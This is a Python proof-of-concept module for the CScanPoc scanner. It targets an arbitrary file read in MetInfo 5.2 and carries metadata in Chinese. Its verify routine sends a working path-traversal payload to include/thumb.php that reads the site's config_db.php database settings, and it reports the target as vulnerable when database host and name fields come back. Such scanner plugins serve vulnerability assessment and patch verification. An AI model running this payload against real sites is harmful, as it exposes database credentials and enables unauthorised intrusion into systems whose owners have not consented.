# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MetInfo_0011'  # 平台漏洞编号，留空
    name = 'MetInfo 5.2 任意文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_OPERATION  # 漏洞类型
    disclosure_date = '2015-01-14'  # 漏洞公布时间
    desc = '''
        MetInfo 5.2（当前最新版本）的 include/thumb.php 文件本来用来获取缩略图，但是其构造的缩略图路径存在外部可控变量，攻击者可以借此获取任意文件内容。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=91694'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = '5.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c711f07b-3acb-43b0-a8f9-4beba716bd9a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://www.wooyun.org/bug.php?action=view&id=91694
            hh = hackhttp.hackhttp()
            payload = '/include/thumb.php?x=1&y=/../../../config&dir=config_db.php'
            _, head, body, _, _ = hh.http(self.target + payload)

            if body and "<?php" in body and "con_db_host" in body and "con_db_name" in body:
                #security_hole(url + "   :任意用户密码修改")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
